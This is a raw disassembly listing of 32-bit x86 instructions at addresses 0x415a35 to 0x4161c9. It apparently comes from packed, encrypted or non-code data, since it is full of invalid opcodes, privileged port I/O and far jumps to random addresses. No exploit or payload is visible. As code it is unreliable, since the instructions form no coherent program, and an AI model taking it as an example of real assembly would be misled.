  415a35:	sub    DWORD PTR [edi+0x6669aad3],0x5f
  415a3c:	mov    ds:0x4008a5fd,eax
  415a41:	inc    eax
  415a42:	sar    DWORD PTR [edx-0x281e2b3c],cl
  415a48:	mov    ecx,DWORD PTR [esi-0x5fce31a]
  415a4e:	push   cs
  415a4f:	mov    eax,0x343951e2
  415a54:	out    0x60,eax
  415a56:	xor    ah,0x6b
  415a59:	pusha  
  415a5a:	ds es xchg edi,eax
  415a5d:	pop    ebp
  415a5e:	pmaddwd mm3,QWORD PTR [ebp+0x2a]
  415a62:	add    ch,dh
  415a64:	(bad)  
  415a65:	loopne 0x415ab9
  415a67:	mov    ?,WORD PTR [edx+0x6b]
  415a6a:	cmp    DWORD PTR [ebp+0x230937c1],ecx
  415a70:	mov    ds:0xd8e5b7ce,eax
  415a75:	sbb    BYTE PTR [ecx*8+0x71e8fd85],bh
  415a7c:	cmp    esi,DWORD PTR [ecx]
  415a7e:	pop    ds
  415a7f:	and    DWORD PTR [edi-0x1f],eax
  415a82:	nop
  415a83:	jecxz  0x415afc
  415a85:	in     al,0x44
  415a87:	nop
  415a88:	mov    ah,0x4b
  415a8a:	adc    bh,BYTE PTR [ecx-0x7ab86686]
  415a90:	and    edx,0xffffffd7
  415a93:	cmp    eax,0xd85267ab
  415a98:	sbb    BYTE PTR fs:[ebp-0x5f],al
  415a9c:	(bad)  
  415a9d:	push   edi
  415a9e:	push   ds
  415a9f:	mov    bl,0x19
  415aa1:	mov    al,ds:0xb4300805
  415aa6:	xor    eax,0x824e5ee4
  415aab:	push   ds
  415aac:	xor    BYTE PTR [ebx-0xd],dl
  415aaf:	inc    ebp
  415ab0:	ins    BYTE PTR es:[edi],dx
  415ab1:	sar    BYTE PTR [edx-0x54],1
  415ab4:	out    0xc1,al
  415ab6:	jl     0x415a57
  415ab8:	(bad)  
  415ab9:	(bad)  
  415aba:	out    dx,al
  415abb:	fxam   
  415abd:	retf   
  415abe:	mov    al,0xf9
  415ac0:	and    al,ch
  415ac2:	add    dl,al
  415ac4:	inc    esi
  415ac5:	test   al,0x4e
  415ac7:	jmp    0x62a82e6b
  415acc:	xchg   esp,eax
  415acd:	hlt    
  415ace:	loope  0x415ae3
  415ad0:	(bad)  
  415ad1:	push   0x32
  415ad3:	in     al,dx
  415ad4:	dec    esi
  415ad5:	fwait
  415ad6:	mov    bh,0xe6
  415ad8:	xchg   edi,eax
  415ad9:	test   al,0xcf
  415adb:	pop    ecx
  415adc:	dec    esp
  415add:	jmp    0x415ad9
  415adf:	add    eax,0xa940864b
  415ae4:	mov    cl,0x1c
  415ae6:	pushf  
  415ae7:	inc    edx
  415ae8:	pop    edx
  415ae9:	xchg   ecx,esi
  415aeb:	cmc    
  415aec:	nop
  415aed:	out    0x1,al
  415aef:	cmp    eax,0x73d3a11a
  415af4:	into   
  415af5:	loope  0x415aa1
  415af7:	mov    edx,0x86d0c336
  415afc:	outs   dx,DWORD PTR ds:[esi]
  415afd:	inc    ebp
  415afe:	cmpps  xmm7,XMMWORD PTR [eax-0x3],0x3d
  415b03:	sub    ebp,DWORD PTR [esi]
  415b05:	(bad)  
  415b07:	jge    0x415abb
  415b09:	pop    ss
  415b0a:	in     eax,0x7d
  415b0c:	jb     0x415b33
  415b0e:	sub    bl,bh
  415b10:	cmp    eax,0x78d357dd
  415b15:	pop    edi
  415b16:	cwde   
  415b17:	jnp    0x415b49
  415b19:	cmp    al,0x33
  415b1b:	sar    DWORD PTR [eax-0x270b5781],cl
  415b21:	cmc    
  415b22:	les    ebx,FWORD PTR [edx-0x2]
  415b25:	mov    cl,0x47
  415b27:	jo     0x415b01
  415b29:	sahf   
  415b2a:	adc    al,0x68
  415b2c:	or     ebx,0xb52985c4
  415b32:	jg     0x415b1d
  415b34:	mov    cl,0x75
  415b36:	dec    esi
  415b37:	xchg   DWORD PTR [edx+0xf714def],esp
  415b3d:	inc    edx
  415b3e:	aam    0x4b
  415b40:	pop    ds
  415b41:	inc    edx
  415b42:	rol    DWORD PTR [edx+0x1b],1
  415b45:	and    ebp,edi
  415b47:	es inc edx
  415b49:	dec    eax
  415b4a:	or     al,0x93
  415b4c:	sub    BYTE PTR [edi+0x2d],bl
  415b4f:	xor    dh,0xfe
  415b52:	loope  0x415b5d
  415b54:	add    eax,0x6624f445
  415b59:	xchg   edx,eax
  415b5a:	mov    bh,0x0
  415b5c:	cmp    al,0x86
  415b5e:	clc    
  415b5f:	retf   0x7a6d
  415b62:	ins    BYTE PTR es:[edi],dx
  415b63:	jne    0x415b3e
  415b65:	pop    ds
  415b66:	xchg   edi,eax
  415b67:	out    0xa3,al
  415b69:	daa    
  415b6a:	outs   dx,DWORD PTR ds:[esi]
  415b6b:	fs loop 0x415b11
  415b6e:	add    al,0xa
  415b70:	out    dx,al
  415b71:	repnz lea esp,[esi-0x7f]
  415b75:	jmp    0x415bf1
  415b77:	sub    BYTE PTR [edi+ebx*2-0x70],dl
  415b7b:	cmp    eax,0xceb3d3cf
  415b80:	call   0x8814:0x69d2bd30
  415b87:	or     esp,edi
  415b89:	retf   0x9c57
  415b8c:	cdq    
  415b8d:	lods   al,BYTE PTR ds:[esi]
  415b8e:	in     eax,0xad
  415b90:	fs scas eax,DWORD PTR es:[edi]
  415b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b93:	addr16 je 0x415c06
  415b96:	mov    ah,0x52
  415b98:	imul   ecx,DWORD PTR [edi+0x50e48c85],0xe3b0ef7
  415ba2:	scas   al,BYTE PTR es:[edi]
  415ba3:	dec    ebx
  415ba4:	fwait
  415ba5:	test   al,0x87
  415ba7:	sub    al,0x5f
  415ba9:	xor    eax,0xc8244f02
  415bae:	imul   ebx,DWORD PTR [eax],0xe
  415bb1:	retf   0xb6bb
  415bb4:	aad    0x6b
  415bb6:	cmp    eax,DWORD PTR [eax]
  415bb8:	out    0x19,eax
  415bba:	fs jp  0x415c1c
  415bbd:	scas   al,BYTE PTR es:[edi]
  415bbe:	outs   dx,DWORD PTR ds:[esi]
  415bbf:	cwde   
  415bc0:	jmp    0x415c24
  415bc2:	push   ebx
  415bc3:	int3   
  415bc4:	call   0xf3984824
  415bc9:	pusha  
  415bca:	mov    ah,0x63
  415bcc:	pop    edi
  415bcd:	push   ss
  415bce:	cmp    DWORD PTR [edx],ecx
  415bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bd1:	and    ecx,DWORD PTR [ebp+edi*1+0x5147d6d7]
  415bd8:	pop    ds
  415bd9:	pop    ecx
  415bda:	rcl    BYTE PTR [ebx-0x1b952067],1
  415be0:	imul   ebp,DWORD PTR [ebx-0x3271f059],0x24
  415be7:	dec    esi
  415be8:	std    
  415be9:	loop   0x415bb7
  415beb:	xor    cl,BYTE PTR [edx+0x66]
  415bee:	and    al,0xfe
  415bf0:	mov    cl,0x5e
  415bf2:	jae    0x415b91
  415bf4:	das    
  415bf5:	pop    es
  415bf6:	loop   0x415bcf
  415bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bf9:	mov    ah,0x2c
  415bfb:	fst    QWORD PTR [eax]
  415bfd:	out    dx,eax
  415bfe:	mov    esi,0x42dfd03e
  415c03:	stos   BYTE PTR es:[edi],al
  415c04:	sti    
  415c05:	pushf  
  415c06:	sbb    ah,bl
  415c08:	mov    dl,0x6b
  415c0a:	push   0xffffff84
  415c0c:	jg     0x415ba0
  415c0e:	push   esi
  415c0f:	mov    edi,esi
  415c11:	push   cs
  415c12:	jns    0x415c2f
  415c14:	and    esp,esi
  415c16:	js     0x415c01
  415c18:	xlat   BYTE PTR ds:[ebx]
  415c19:	aas    
  415c1a:	sar    DWORD PTR [ebp-0x1db0f429],0x3e
  415c21:	enter  0xe804,0xb
  415c25:	out    0x26,al
  415c27:	mov    eax,0xa54c129d
  415c2c:	aam    0xf5
  415c2e:	or     eax,0xcbac87c
  415c33:	cmp    BYTE PTR [ecx+0xb],dl
  415c36:	mov    eax,ds:0x60d9ab41
  415c3b:	and    dl,dh
  415c3d:	inc    ecx
  415c3e:	mov    ecx,0x4b39ea08
  415c43:	cmp    BYTE PTR [edi],dl
  415c45:	icebp  
  415c46:	jmp    0x69541b26
  415c4b:	inc    edx
  415c4c:	cmp    al,0xb5
  415c4e:	data16 (bad) 
  415c50:	jmp    0x4db286e8
  415c55:	or     dl,BYTE PTR ds:0xecec1cd
  415c5b:	shl    DWORD PTR [eax-0x5c581809],0xcb
  415c62:	ins    BYTE PTR es:[edi],dx
  415c63:	outs   dx,DWORD PTR ds:[esi]
  415c64:	or     DWORD PTR [si-0x6f3f],edx
  415c69:	sub    edi,esi
  415c6b:	ja     0x415c60
  415c6d:	nop
  415c6e:	fs mov bl,0x43
  415c71:	fcomip st,st(6)
  415c73:	adc    edx,DWORD PTR [esi]
  415c75:	mov    esi,0x9cb0ff0b
  415c7a:	bound  ebp,QWORD PTR [edi+0x62]
  415c7d:	mov    eax,ds:0x28320ff2
  415c82:	jo     0x415cfe
  415c84:	sub    eax,0x3da0b1bd
  415c89:	or     ebx,edx
  415c8b:	inc    edi
  415c8c:	imul   edi,DWORD PTR [esi+0xfe76c4e],0xffffffaa
  415c93:	jg     0x415c5a
  415c95:	or     eax,0x1a069c68
  415c9a:	pushf  
  415c9b:	inc    ecx
  415c9c:	fwait
  415c9d:	(bad)  
  415c9e:	clc    
  415c9f:	push   cs
  415ca0:	inc    esi
  415ca1:	fistp  QWORD PTR [edi]
  415ca3:	call   0x7d72eb35
  415ca8:	mov    esp,0xf0a27f87
  415cad:	retf   
  415cae:	es leave 
  415cb0:	pop    ecx
  415cb1:	sti    
  415cb2:	pushf  
  415cb3:	pushw  cs
  415cb5:	in     al,dx
  415cb6:	sub    DWORD PTR [eax+0x738e86a4],ebp
  415cbc:	shl    BYTE PTR [ecx-0x65c47f4c],0x7d
  415cc3:	test   BYTE PTR [edi-0x1b],bl
  415cc6:	and    BYTE PTR [ebx+0x568915ff],0xb3
  415ccd:	daa    
  415cce:	sub    al,0x6d
  415cd0:	or     bl,BYTE PTR [edx]
  415cd2:	and    dh,BYTE PTR [ebx]
  415cd4:	std    
  415cd5:	pop    ss
  415cd6:	int3   
  415cd7:	xor    dl,cl
  415cd9:	lds    ecx,FWORD PTR [eax+0x54]
  415cdc:	in     al,0xb3
  415cde:	mov    BYTE PTR [ebx+0x72],ah
  415ce1:	lock mov cl,0x4d
  415ce4:	jg     0x415c98
  415ce6:	push   cs
  415ce7:	pop    edx
  415ce8:	ret    
  415ce9:	shl    esp,cl
  415ceb:	loopne 0x415cea
  415ced:	inc    esp
  415cef:	pop    edi
  415cf0:	jp     0x415cb4
  415cf2:	dec    ebx
  415cf3:	xchg   edi,eax
  415cf4:	dec    ecx
  415cf5:	fstp   DWORD PTR cs:[edx]
  415cf8:	lock mov bh,0xe
  415cfb:	sti    
  415cfc:	push   edx
  415cfd:	ret    0x427d
  415d00:	adc    ch,BYTE PTR [edx+eiz*8-0x502aa14c]
  415d07:	lods   eax,DWORD PTR ds:[esi]
  415d08:	mov    dl,0x5d
  415d0a:	(bad)  
  415d0b:	mov    ah,0xe8
  415d0d:	(bad)  
  415d0e:	test   ebp,0x94ee9aed
  415d14:	push   ebp
  415d15:	outs   dx,DWORD PTR ds:[esi]
  415d16:	pop    esi
  415d17:	or     DWORD PTR [edx+ecx*4+0x2342938f],ecx
  415d1e:	(bad)  
  415d1f:	mov    ah,0xc5
  415d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d22:	xor    eax,0x8b5f5706
  415d27:	ins    DWORD PTR es:[edi],dx
  415d28:	jns    0x120ed9ca
  415d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d2f:	mov    cl,0xc8
  415d31:	popf   
  415d32:	add    eax,0xe246e704
  415d37:	or     al,0x86
  415d39:	test   eax,0xd5c67071
  415d3e:	test   al,0x8a
  415d40:	rol    cl,cl
  415d42:	popf   
  415d43:	sub    ecx,0xffffffd1
  415d46:	test   ch,0xec
  415d49:	ret    
  415d4a:	sbb    edx,DWORD PTR [esi-0x1]
  415d4d:	xor    DWORD PTR [esp+ecx*2+0x2c5ae0c],ebp
  415d54:	jmp    FWORD PTR [esp+esi*2-0x64]
  415d58:	div    BYTE PTR [ebx-0x4befffb6]
  415d5e:	mov    DWORD PTR [ebp+0x677f01f7],edi
  415d64:	in     al,0x50
  415d66:	enter  0x960d,0xfb
  415d6a:	scas   eax,DWORD PTR es:[edi]
  415d6b:	rol    DWORD PTR [ebx],0xd6
  415d6e:	dec    esp
  415d6f:	fisubr WORD PTR ds:0x67920d07
  415d75:	enter  0xaa35,0x10
  415d79:	add    al,BYTE PTR [ecx]
  415d7b:	sub    BYTE PTR gs:[esi+0x32],al
  415d7f:	retf   0x791
  415d82:	sbb    DWORD PTR ds:0xb52b8b9e,esi
  415d88:	jecxz  0x415de1
  415d8a:	mov    ah,0x73
  415d8c:	gs iret 
  415d8e:	hlt    
  415d8f:	adc    esi,DWORD PTR [edx]
  415d91:	xchg   ebx,eax
  415d92:	mov    BYTE PTR [ebx+0x67],al
  415d95:	dec    edx
  415d96:	mov    esi,0x49549472
  415d9b:	out    0x1,al
  415d9d:	clc    
  415d9e:	push   0xffffffe6
  415da0:	push   0xb13814c0
  415da5:	adc    al,0x38
  415da7:	aam    0x30
  415da9:	and    dl,BYTE PTR [eax+0x61]
  415dac:	jp     0x415dcd
  415dae:	dec    edx
  415daf:	xor    ebp,0xffffffc6
  415db2:	ss xchg edi,eax
  415db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415db5:	push   esi
  415db6:	jae    0x415dd0
  415db8:	loop   0x415de2
  415dba:	xchg   DWORD PTR [ebp+0x5fd93f1f],ebp
  415dc0:	jle    0x415d82
  415dc2:	shr    DWORD PTR [edi+0x69],1
  415dc5:	pop    ss
  415dc6:	not    dh
  415dc8:	jo     0x415d98
  415dca:	push   ecx
  415dcb:	and    eax,0x50a1ec5f
  415dd0:	out    0x70,al
  415dd2:	jmp    0x7acb4838
  415dd7:	jb     0x415df1
  415dd9:	cmp    al,0xcd
  415ddb:	adc    DWORD PTR [ecx],esp
  415ddd:	stos   BYTE PTR es:[edi],al
  415dde:	pop    esi
  415ddf:	shr    BYTE PTR [ecx+0x6b5e3e24],1
  415de5:	int3   
  415de6:	jae    0x415e32
  415de8:	xchg   esp,eax
  415de9:	push   ds
  415dea:	in     eax,dx
  415deb:	mov    edx,esi
  415ded:	dec    eax
  415dee:	and    DWORD PTR [esi+edx*8],ebp
  415df1:	int    0x3d
  415df3:	mov    eax,ds:0x3cb99b2
  415df8:	push   DWORD PTR [esi+edx*8+0x4a93d4c2]
  415dff:	or     eax,0xa4524bbf
  415e04:	and    ebp,edx
  415e06:	enter  0x95be,0x72
  415e0a:	push   ds
  415e0b:	das    
  415e0c:	clc    
  415e0d:	ja     0x415e21
  415e0f:	xor    eax,0x7a
  415e12:	xchg   edi,eax
  415e13:	sbb    eax,0x7ed7cf67
  415e18:	jbe    0x415e96
  415e1a:	(bad)  
  415e1b:	ficomp DWORD PTR [ebx+0x7df1cebf]
  415e21:	mov    al,0x6b
  415e23:	daa    
  415e24:	and    cl,BYTE PTR [esi]
  415e26:	and    al,0x45
  415e28:	arpl   WORD PTR [edx+0x0],ax
  415e2b:	sti    
  415e2c:	sbb    ah,dh
  415e2e:	add    DWORD PTR [ebx+ebx*1],0xffffffd0
  415e32:	lock jo 0x415e3f
  415e35:	jnp    0x415dd1
  415e37:	inc    edx
  415e38:	adc    BYTE PTR [ebx+0x625916e1],al
  415e3e:	and    BYTE PTR [edi+0x5b],bl
  415e41:	fisub  WORD PTR [ebp+eax*8+0x7aaf8ec2]
  415e48:	cmp    BYTE PTR [eax+0x15],cl
  415e4b:	xor    eax,0xd8229b6a
  415e50:	and    ebp,esi
  415e52:	inc    edi
  415e53:	aam    0xf6
  415e55:	adc    al,0x57
  415e57:	push   esp
  415e58:	and    al,0xa3
  415e5a:	xchg   ebx,eax
  415e5b:	add    eax,0x760bf357
  415e60:	ins    DWORD PTR es:[edi],dx
  415e61:	out    0x17,eax
  415e63:	popa   
  415e64:	mov    al,0xa1
  415e66:	sbb    al,0x85
  415e68:	add    al,0x34
  415e6a:	test   BYTE PTR [ebx-0x2e3e2472],0x9
  415e71:	or     DWORD PTR ds:0x3708c437,ebp
  415e77:	in     al,dx
  415e78:	dec    esi
  415e79:	inc    esp
  415e7a:	js     0x415ed7
  415e7c:	fld    QWORD PTR [eax]
  415e7e:	cmp    al,0x8
  415e80:	test   ebx,edx
  415e82:	ror    BYTE PTR [edx+eiz*8-0x38910d85],1
  415e89:	jbe    0x415e1a
  415e8b:	stos   BYTE PTR es:[edi],al
  415e8c:	jno    0x415e54
  415e8e:	push   ebp
  415e8f:	adc    eax,0xa9ae4516
  415e94:	cdq    
  415e95:	sbb    al,0xec
  415e97:	aad    0x8
  415e99:	and    eax,DWORD PTR [edx+0x610ad3af]
  415e9f:	inc    esp
  415ea0:	or     DWORD PTR [eax-0x75],esp
  415ea3:	xor    bl,ah
  415ea5:	bound  eax,QWORD PTR [edx]
  415ea7:	jae    0x415e76
  415ea9:	out    0x8a,al
  415eab:	sub    edx,DWORD PTR [edi+0x42160e6e]
  415eb1:	mov    al,BYTE PTR [ebx-0x2bbd0fa9]
  415eb7:	mov    BYTE PTR [edi],bh
  415eb9:	fcmovnb st,st(7)
  415ebb:	cmp    eax,0x57a405e0
  415ec0:	addr16 push cs
  415ec2:	lods   eax,DWORD PTR ds:[esi]
  415ec3:	scas   eax,DWORD PTR es:[edi]
  415ec4:	sbb    BYTE PTR [ebp+0x56],cl
  415ec7:	push   ss
  415ec8:	adc    BYTE PTR [edx-0x2f167cce],dh
  415ece:	mov    ?,WORD PTR [ebp+0x219dedeb]
  415ed4:	xchg   DWORD PTR [ecx-0x39cb497a],eax
  415eda:	jle    0x415f1b
  415edc:	test   DWORD PTR [eax],esp
  415ede:	ret    
  415edf:	adc    cl,BYTE PTR [ebx]
  415ee1:	ja     0x415ec5
  415ee3:	push   cs
  415ee4:	mov    bh,0x6c
  415ee6:	pop    eax
  415ee7:	xor    BYTE PTR [ebx+ecx*2],bh
  415eea:	xor    bl,BYTE PTR [ecx-0x12]
  415eed:	pop    ecx
  415eee:	pop    es
  415eef:	push   ds
  415ef0:	ja     0x415f22
  415ef2:	mov    ah,0xcd
  415ef4:	xchg   edx,eax
  415ef5:	outs   dx,DWORD PTR ds:[esi]
  415ef6:	xchg   esi,eax
  415ef7:	jecxz  0x415f23
  415ef9:	jno    0x415e7c
  415efb:	pushw  0xff8a
  415efe:	dec    edi
  415eff:	inc    esi
  415f00:	popa   
  415f01:	inc    esi
  415f02:	inc    ebp
  415f03:	sub    ebp,DWORD PTR [ecx+0x2d]
  415f06:	in     al,0x32
  415f08:	sub    al,0xd3
  415f0a:	push   es
  415f0b:	mov    esi,0x8840681a
  415f11:	imul   ecx,DWORD PTR [ebx+esi*8-0x7179c64f],0x17
  415f19:	mov    ecx,0xe6a6b1c7
  415f1e:	retf   0x5c22
  415f21:	push   ds
  415f22:	lds    eax,FWORD PTR [ecx]
  415f24:	pop    ebp
  415f25:	xchg   ecx,eax
  415f26:	mov    ch,0xe9
  415f28:	sbb    eax,0xdca92a0f
  415f2d:	pusha  
  415f2e:	cmp    eax,DWORD PTR [ebx-0x75]
  415f31:	and    al,dh
  415f33:	(bad)  
  415f34:	or     bh,BYTE PTR [eax]
  415f36:	pop    ebx
  415f37:	or     dl,BYTE PTR [ecx+edx*2-0x29416fdf]
  415f3e:	push   ebx
  415f3f:	rol    DWORD PTR [eax+0x53b84cdf],0x13
  415f46:	xchg   edx,eax
  415f47:	cld    
  415f48:	sub    eax,0x3a1b840d
  415f4d:	ror    BYTE PTR [eax-0x5b803b27],0xc9
  415f54:	sub    esp,edx
  415f56:	xchg   ecx,eax
  415f57:	es pop ebp
  415f59:	sti    
  415f5a:	mov    ebx,DWORD PTR [eax*1+0x5b54f0ee]
  415f61:	enter  0x20fd,0xa2
  415f65:	div    BYTE PTR [ebp-0x42]
  415f68:	xchg   esp,eax
  415f69:	sbb    ebp,esp
  415f6b:	adc    DWORD PTR [edi+ecx*2-0x2b75afd8],edx
  415f72:	mul    BYTE PTR [ebx]
  415f74:	std    
  415f75:	nop
  415f76:	and    ecx,DWORD PTR ds:0x17e5948a
  415f7c:	fwait
  415f7d:	retf   0x8369
  415f80:	js     0x415f07
  415f82:	dec    edi
  415f83:	loopne 0x415fd9
  415f85:	aaa    
  415f86:	xchg   ebx,eax
  415f87:	arpl   WORD PTR [edx],dx
  415f89:	or     al,BYTE PTR [ebp+0x71d660d8]
  415f8f:	loope  0x415f58
  415f91:	call   0x8a55fe9c
  415f96:	test   edi,edx
  415f98:	dec    ebp
  415f99:	and    al,0x7a
  415f9b:	jmp    0x415f64
  415f9d:	sbb    BYTE PTR [ebx-0x1506fc72],ch
  415fa3:	sub    al,ah
  415fa5:	leave  
  415fa6:	inc    esp
  415fa7:	shl    BYTE PTR [ebx],0xda
  415faa:	sub    DWORD PTR [ebx],ebx
  415fac:	scas   al,BYTE PTR es:[edi]
  415fad:	jns    0x415f70
  415faf:	stos   DWORD PTR es:[edi],eax
  415fb0:	or     bl,BYTE PTR [esi+0x2a]
  415fb3:	popa   
  415fb4:	iret   
  415fb5:	popf   
  415fb6:	scas   eax,DWORD PTR es:[edi]
  415fb7:	loope  0x415fbb
  415fb9:	fimul  WORD PTR ds:0x5d5c1144
  415fbf:	psadbw mm7,QWORD PTR [ebx-0xd]
  415fc3:	jle    0x415f98
  415fc5:	dec    ebp
  415fc6:	xchg   ebp,eax
  415fc7:	inc    edx
  415fc8:	lods   al,BYTE PTR ds:[esi]
  415fc9:	fstp   st(1)
  415fcb:	and    BYTE PTR [eax+0x108e8e68],ch
  415fd1:	cmp    bl,BYTE PTR [eax+0x4d]
  415fd4:	mov    esp,0x1a1b3044
  415fd9:	daa    
  415fda:	pusha  
  415fdb:	retf   0xf8ee
  415fde:	push   0xffffffbb
  415fe0:	add    eax,0xd9477cbc
  415fe5:	or     DWORD PTR [ebx+eax*1],0xb
  415fe9:	add    eax,0x336fb574
  415fee:	test   al,0x1c
  415ff0:	inc    edi
  415ff1:	cmp    bl,ch
  415ff3:	das    
  415ff4:	adc    DWORD PTR [ecx+0x6f],edi
  415ff7:	jae    0x41606d
  415ff9:	popa   
  415ffa:	xchg   ecx,eax
  415ffb:	add    eax,0x79ec50f7
  416000:	add    ah,BYTE PTR [edx+0x18]
  416003:	outs   dx,BYTE PTR ds:[esi]
  416004:	xor    al,0x69
  416006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416007:	stos   DWORD PTR es:[edi],eax
  416008:	or     bh,cl
  41600a:	pop    edi
  41600b:	push   edi
  41600c:	hlt    
  41600d:	scas   al,BYTE PTR es:[edi]
  41600e:	push   ebp
  41600f:	cmp    ch,BYTE PTR [esi]
  416011:	xchg   DWORD PTR [ecx+0x45],esi
  416014:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416015:	push   esp
  416016:	or     al,0x84
  416018:	jns    0x416027
  41601a:	enter  0x19aa,0x73
  41601e:	mov    es,WORD PTR [ebx-0x44]
  416021:	inc    ebx
  416022:	aas    
  416023:	cwde   
  416024:	aas    
  416025:	retf   
  416026:	push   ss
  416027:	clc    
  416028:	fidivr DWORD PTR [edx-0x5c]
  41602b:	ret    
  41602c:	out    0xe2,al
  41602e:	push   edi
  41602f:	aaa    
  416030:	ss pop ecx
  416032:	(bad)  
  416033:	and    esp,DWORD PTR [edx-0x1d68bd67]
  416039:	cwde   
  41603a:	shr    BYTE PTR [ecx],cl
  41603c:	icebp  
  41603d:	push   ss
  41603e:	pop    edi
  41603f:	jecxz  0x415fea
  416041:	aaa    
  416042:	jmp    0xccbbccac
  416047:	push   ss
  416048:	inc    ebx
  416049:	pop    ss
  41604a:	pusha  
  41604b:	mov    edi,0x74023e69
  416050:	retf   0x3703
  416053:	lea    esi,[ecx]
  416055:	enter  0x6f29,0x88
  416059:	or     al,0xc8
  41605b:	pop    es
  41605c:	fs out 0xed,eax
  41605f:	inc    esi
  416060:	add    BYTE PTR [eax],al
  416062:	cmp    dh,BYTE PTR [edx+edx*4]
  416065:	pop    ebp
  416066:	cmp    eax,ebp
  416068:	pop    ss
  416069:	hlt    
  41606a:	jno    0x416033
  41606c:	aam    0x4d
  41606e:	call   0x962a87fe
  416073:	xor    ebx,DWORD PTR [edi]
  416075:	out    0x6f,al
  416077:	push   ds
  416078:	dec    ecx
  416079:	std    
  41607a:	fadd   QWORD PTR [ebx-0x5c93f122]
  416080:	sbb    BYTE PTR [ecx+eiz*4+0x2b7bb0e2],ah
  416087:	xchg   esi,eax
  416088:	ret    0xc553
  41608b:	add    DWORD PTR [ebx-0xf],eax
  41608e:	sti    
  41608f:	add    bh,BYTE PTR [ecx+esi*1]
  416092:	gs retf 0x2530
  416096:	(bad)  
  416098:	mov    bl,0x6c
  41609a:	or     edx,edx
  41609c:	mov    edx,0x94eb4540
  4160a1:	ds aaa 
  4160a3:	(bad)  
  4160a4:	lock and al,0xe4
  4160a7:	pop    ss
  4160a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160aa:	ins    BYTE PTR es:[edi],dx
  4160ab:	pop    esp
  4160ac:	fisubr DWORD PTR [eax]
  4160ae:	lods   eax,DWORD PTR ds:[esi]
  4160af:	and    ebp,DWORD PTR [edx]
  4160b1:	mov    al,0x4a
  4160b3:	push   ebp
  4160b4:	les    ecx,FWORD PTR [esi+ebx*1+0xc]
  4160b8:	outs   dx,BYTE PTR ds:[esi]
  4160b9:	aam    0x54
  4160bb:	add    cl,BYTE PTR [ebp-0xefdae29]
  4160c1:	int    0xb2
  4160c3:	xchg   DWORD PTR [esp+ebx*1],esp
  4160c6:	loope  0x416121
  4160c8:	jno    0x4160eb
  4160ca:	xor    al,0xb9
  4160cc:	xor    BYTE PTR [esi],cl
  4160ce:	loop   0x41611a
  4160d0:	es jne 0x4160a6
  4160d3:	call   0x8a2:0x46841c80
  4160da:	lods   al,BYTE PTR ds:[esi]
  4160db:	mov    ecx,0x71b4b5ce
  4160e0:	push   0x1480e196
  4160e5:	dec    DWORD PTR [ebp-0x4e]
  4160e8:	xor    edi,ebp
  4160ea:	leave  
  4160eb:	adc    al,0x35
  4160ed:	inc    edx
  4160ee:	and    BYTE PTR ds:0x5f3d5e89,ch
  4160f4:	add    esp,ebx
  4160f6:	pop    ss
  4160f7:	pusha  
  4160f8:	dec    ebp
  4160f9:	stos   DWORD PTR es:[edi],eax
  4160fa:	and    DWORD PTR [ebx],0xfb2a32bb
  416100:	inc    edx
  416101:	dec    edi
  416102:	call   0x39ac:0x22d2eaed
  416109:	dec    ebp
  41610a:	imul   ah
  41610c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41610d:	loop   0x41617e
  41610f:	sar    DWORD PTR [ecx],0xbe
  416112:	adc    eax,0xe0b162c6
  416117:	stos   DWORD PTR es:[edi],eax
  416118:	mov    ah,0xc1
  41611a:	lea    esi,[ecx]
  41611c:	fdiv   st,st(2)
  41611e:	je     0x416183
  416120:	xor    bh,0xbe
  416123:	mov    dh,BYTE PTR [edx-0x55]
  416126:	adc    DWORD PTR [esi],ebp
  416128:	mov    dl,0xad
  41612a:	test   BYTE PTR [ebp+0x18],dl
  41612d:	je     0x41619a
  41612f:	or     ebx,DWORD PTR [ebx+0x35]
  416132:	aaa    
  416133:	into   
  416134:	sbb    ecx,DWORD PTR [edx-0x7b]
  416137:	adc    DWORD PTR [ebx+0x5d9d92c4],ecx
  41613d:	aad    0xb4
  41613f:	nop
  416140:	in     eax,dx
  416141:	push   es
  416142:	adc    esi,DWORD PTR [edx+0x5d0864e]
  416148:	mov    ebp,0x9260a6b7
  41614d:	mov    dh,0x9a
  41614f:	cmp    eax,0x9bf38d06
  416154:	cmp    cl,dl
  416156:	adc    eax,0x610ba5e2
  41615b:	out    0x12,eax
  41615d:	in     eax,0xe8
  41615f:	push   ds
  416160:	out    0xbc,eax
  416162:	std    
  416163:	cmp    ah,BYTE PTR [eax]
  416165:	out    dx,al
  416166:	into   
  416167:	pop    esp
  416168:	add    eax,0x85e2df50
  41616d:	jmp    0x92fa:0xc2417ea1
  416174:	xor    dh,BYTE PTR [esi-0x78]
  416177:	or     DWORD PTR [eax-0x2f],esp
  41617a:	sbb    al,0x78
  41617c:	imul   esi,DWORD PTR [ecx-0x7b],0xffffffa0
  416180:	xor    eax,0xe08093c0
  416185:	out    0x61,al
  416187:	int3   
  416188:	mov    ebp,0x188cf72b
  41618d:	xchg   edx,eax
  41618e:	sar    DWORD PTR [ebp-0x5f],cl
  416191:	pop    es
  416192:	(bad)  
  416193:	push   edi
  416194:	mov    bh,0x52
  416196:	enter  0x50a7,0x2f
  41619a:	jnp    0x41614c
  41619c:	push   eax
  41619d:	stos   BYTE PTR es:[edi],al
  41619e:	(bad)  
  41619f:	and    edi,esi
  4161a1:	cmp    al,0x6d
  4161a3:	into   
  4161a4:	popa   
  4161a5:	mov    edx,0x8b11b24d
  4161aa:	jno    0x416227
  4161ac:	in     eax,0x76
  4161ae:	mov    ds,WORD PTR [eiz*2-0x69a3ce2a]
  4161b5:	std    
  4161b6:	pop    edi
  4161b7:	adc    DWORD PTR [eax],0xffffffe6
  4161ba:	mov    eax,ds:0xa8d1a39a
  4161bf:	pop    es
  4161c0:	or     eax,0x5ca19171
  4161c5:	inc    ecx
  4161c6:	jno    0x41621c
  4161c8:	scas   eax,DWORD PTR es:[edi]
  4161c9:	and    al,0xa9
